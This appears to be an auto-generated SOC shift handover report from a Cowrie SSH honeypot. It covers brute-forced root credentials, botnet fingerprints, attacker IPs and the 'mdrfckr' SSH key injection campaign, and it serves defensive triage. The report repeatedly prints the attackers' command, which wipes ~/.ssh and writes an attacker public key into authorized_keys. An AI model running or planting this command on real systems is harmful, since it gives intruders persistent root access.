# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-30 |
| **Generated At** | 2026-05-30T17:12:59Z |
| **Shift Time** | 17:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **72** |
| Confirmed Threats | **52** |
| False Positives Filtered | **20** (27.8%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **10** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **58** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **26** |
| Unique Credential Pairs | **13** |
| Unique Usernames | **7** |
| Unique Passwords | **13** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 7 |
| `prova` | 1 |
| `thiago` | 1 |
| `usuario2` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `zhbjETuyMffoL8F` | 2 |
| `prova` | 1 |
| `121212` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `root` | `zhbjETuyMffoL8F` | 2 |
| `prova` | `prova` | 1 |
| `root` | `121212` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `zhbjETuyMffoL8F` | `223.233.83.104` | 2026-05-30T15:43:54 |
| `root` | `3245gs5662d34` | `223.233.83.104` | 2026-05-30T15:43:56 |
| `root` | `121212` | `103.191.92.236` | 2026-05-30T15:53:26 |
| `root` | `3245gs5662d34` | `103.191.92.236` | 2026-05-30T15:53:31 |
| `root` | `1q2w3e4r!` | `103.191.92.236` | 2026-05-30T15:53:55 |
| `root` | `Q1w2e3r4t5y6` | `103.191.92.236` | 2026-05-30T15:54:16 |
| `root` | `Test@2020` | `103.191.92.236` | 2026-05-30T15:54:35 |
| `root` | `zhbjETuyMffoL8F` | `103.191.92.236` | 2026-05-30T15:54:57 |
| `root` | `P@ssw0rd` | `103.191.92.236` | 2026-05-30T15:55:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **72** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 29 |
| Paramiko (Python) | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 25 | 2 |
| `d6729b7f2442...` | Mirai/variant | 1 | 1 |
| `1f2f2f9b0a73...` | Mirai/variant | 1 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 25 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `1f2f2f9b0a73...` | libssh | 1 | 1 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `223.233.83.104`, `103.191.92.236`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **17** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS146966` | China Telecom | 1 | HIGH |
| `AS204428` | SS-Net | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-826a0acb9b1d

| Field | Detail |
|---|---|
| **Source IP** | `223.233.83[.]104` |
| **First Seen** | 2026-05-30 15:43 |
| **Last Seen** | 2026-05-30 15:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:43:54` | `cowrie.session.connect` |
| `2026-05-30 15:43:54` | `cowrie.client.version` |
| `2026-05-30 15:43:54` | `cowrie.client.kex` |
| `2026-05-30 15:43:54` | `cowrie.login.success` |
| `2026-05-30 15:43:55` | `cowrie.session.params` |
| `2026-05-30 15:43:55` | `cowrie.command.input` |
| `2026-05-30 15:43:55` | `cowrie.command.failed` |
| `2026-05-30 15:43:55` | `cowrie.log.closed` |
| `2026-05-30 15:43:55` | `cowrie.session.params` |
| `2026-05-30 15:43:55` | `cowrie.command.input` |
| `2026-05-30 15:43:55` | `cowrie.session.file_download` |
| `2026-05-30 15:43:55` | `cowrie.log.closed` |
| `2026-05-30 15:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `223.233.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c0300e7d97e

| Field | Detail |
|---|---|
| **Source IP** | `223.233.83[.]104` |
| **First Seen** | 2026-05-30 15:43 |
| **Last Seen** | 2026-05-30 15:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:43:56` | `cowrie.session.connect` |
| `2026-05-30 15:43:56` | `cowrie.client.version` |
| `2026-05-30 15:43:56` | `cowrie.client.kex` |
| `2026-05-30 15:43:56` | `cowrie.login.success` |
| `2026-05-30 15:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `223.233.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c3edf77ccb

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:53 |
| **Last Seen** | 2026-05-30 15:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:53:25` | `cowrie.session.connect` |
| `2026-05-30 15:53:25` | `cowrie.client.version` |
| `2026-05-30 15:53:25` | `cowrie.client.kex` |
| `2026-05-30 15:53:26` | `cowrie.login.success` |
| `2026-05-30 15:53:27` | `cowrie.session.params` |
| `2026-05-30 15:53:27` | `cowrie.command.input` |
| `2026-05-30 15:53:27` | `cowrie.command.failed` |
| `2026-05-30 15:53:27` | `cowrie.log.closed` |
| `2026-05-30 15:53:27` | `cowrie.session.params` |
| `2026-05-30 15:53:27` | `cowrie.command.input` |
| `2026-05-30 15:53:27` | `cowrie.session.file_download` |
| `2026-05-30 15:53:27` | `cowrie.log.closed` |
| `2026-05-30 15:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57409ff00205

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:53 |
| **Last Seen** | 2026-05-30 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:53:30` | `cowrie.session.connect` |
| `2026-05-30 15:53:30` | `cowrie.client.version` |
| `2026-05-30 15:53:30` | `cowrie.client.kex` |
| `2026-05-30 15:53:31` | `cowrie.login.success` |
| `2026-05-30 15:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1873f7fa413

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:53 |
| **Last Seen** | 2026-05-30 15:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:53:54` | `cowrie.session.connect` |
| `2026-05-30 15:53:54` | `cowrie.client.version` |
| `2026-05-30 15:53:54` | `cowrie.client.kex` |
| `2026-05-30 15:53:55` | `cowrie.login.success` |
| `2026-05-30 15:53:55` | `cowrie.session.params` |
| `2026-05-30 15:53:55` | `cowrie.command.input` |
| `2026-05-30 15:53:55` | `cowrie.command.failed` |
| `2026-05-30 15:53:55` | `cowrie.log.closed` |
| `2026-05-30 15:53:56` | `cowrie.session.params` |
| `2026-05-30 15:53:56` | `cowrie.command.input` |
| `2026-05-30 15:53:56` | `cowrie.session.file_download` |
| `2026-05-30 15:53:56` | `cowrie.log.closed` |
| `2026-05-30 15:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d4e979872b0

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:53 |
| **Last Seen** | 2026-05-30 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:53:58` | `cowrie.session.connect` |
| `2026-05-30 15:53:58` | `cowrie.client.version` |
| `2026-05-30 15:53:59` | `cowrie.client.kex` |
| `2026-05-30 15:53:59` | `cowrie.login.success` |
| `2026-05-30 15:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c30bc54641

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:54 |
| **Last Seen** | 2026-05-30 15:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:54:15` | `cowrie.session.connect` |
| `2026-05-30 15:54:15` | `cowrie.client.version` |
| `2026-05-30 15:54:15` | `cowrie.client.kex` |
| `2026-05-30 15:54:16` | `cowrie.login.success` |
| `2026-05-30 15:54:16` | `cowrie.session.params` |
| `2026-05-30 15:54:16` | `cowrie.command.input` |
| `2026-05-30 15:54:16` | `cowrie.command.failed` |
| `2026-05-30 15:54:17` | `cowrie.log.closed` |
| `2026-05-30 15:54:17` | `cowrie.session.params` |
| `2026-05-30 15:54:17` | `cowrie.command.input` |
| `2026-05-30 15:54:17` | `cowrie.session.file_download` |
| `2026-05-30 15:54:17` | `cowrie.log.closed` |
| `2026-05-30 15:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8153e31938c3

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:54 |
| **Last Seen** | 2026-05-30 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:54:20` | `cowrie.session.connect` |
| `2026-05-30 15:54:20` | `cowrie.client.version` |
| `2026-05-30 15:54:20` | `cowrie.client.kex` |
| `2026-05-30 15:54:21` | `cowrie.login.success` |
| `2026-05-30 15:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4634f5967317

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:54 |
| **Last Seen** | 2026-05-30 15:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:54:34` | `cowrie.session.connect` |
| `2026-05-30 15:54:34` | `cowrie.client.version` |
| `2026-05-30 15:54:35` | `cowrie.client.kex` |
| `2026-05-30 15:54:35` | `cowrie.login.success` |
| `2026-05-30 15:54:36` | `cowrie.session.params` |
| `2026-05-30 15:54:36` | `cowrie.command.input` |
| `2026-05-30 15:54:36` | `cowrie.command.failed` |
| `2026-05-30 15:54:36` | `cowrie.log.closed` |
| `2026-05-30 15:54:37` | `cowrie.session.params` |
| `2026-05-30 15:54:37` | `cowrie.command.input` |
| `2026-05-30 15:54:37` | `cowrie.session.file_download` |
| `2026-05-30 15:54:37` | `cowrie.log.closed` |
| `2026-05-30 15:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbce164e5b4b

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:54 |
| **Last Seen** | 2026-05-30 15:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:54:39` | `cowrie.session.connect` |
| `2026-05-30 15:54:39` | `cowrie.client.version` |
| `2026-05-30 15:54:39` | `cowrie.client.kex` |
| `2026-05-30 15:54:40` | `cowrie.login.success` |
| `2026-05-30 15:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1b2f9642cb

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:54 |
| **Last Seen** | 2026-05-30 15:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:54:56` | `cowrie.session.connect` |
| `2026-05-30 15:54:56` | `cowrie.client.version` |
| `2026-05-30 15:54:56` | `cowrie.client.kex` |
| `2026-05-30 15:54:57` | `cowrie.login.success` |
| `2026-05-30 15:54:57` | `cowrie.session.params` |
| `2026-05-30 15:54:57` | `cowrie.command.input` |
| `2026-05-30 15:54:57` | `cowrie.command.failed` |
| `2026-05-30 15:54:58` | `cowrie.log.closed` |
| `2026-05-30 15:54:58` | `cowrie.session.params` |
| `2026-05-30 15:54:58` | `cowrie.command.input` |
| `2026-05-30 15:54:58` | `cowrie.session.file_download` |
| `2026-05-30 15:54:58` | `cowrie.log.closed` |
| `2026-05-30 15:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c48c32344df8

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:55 |
| **Last Seen** | 2026-05-30 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:55:01` | `cowrie.session.connect` |
| `2026-05-30 15:55:01` | `cowrie.client.version` |
| `2026-05-30 15:55:01` | `cowrie.client.kex` |
| `2026-05-30 15:55:02` | `cowrie.login.success` |
| `2026-05-30 15:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df19f5fff976

| Field | Detail |
|---|---|
| **Source IP** | `103.191.92[.]236` |
| **First Seen** | 2026-05-30 15:55 |
| **Last Seen** | 2026-05-30 15:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 15:55:22` | `cowrie.session.connect` |
| `2026-05-30 15:55:22` | `cowrie.client.version` |
| `2026-05-30 15:55:22` | `cowrie.client.kex` |
| `2026-05-30 15:55:23` | `cowrie.login.success` |
| `2026-05-30 15:55:23` | `cowrie.session.params` |
| `2026-05-30 15:55:23` | `cowrie.command.input` |
| `2026-05-30 15:55:23` | `cowrie.command.failed` |
| `2026-05-30 15:55:24` | `cowrie.log.closed` |
| `2026-05-30 15:55:24` | `cowrie.session.params` |
| `2026-05-30 15:55:24` | `cowrie.command.input` |
| `2026-05-30 15:55:24` | `cowrie.session.file_download` |
| `2026-05-30 15:55:24` | `cowrie.log.closed` |
| `2026-05-30 15:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.92[.]236` to AbuseIPDB if not already reported
- [ ] Block `103.191.92[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
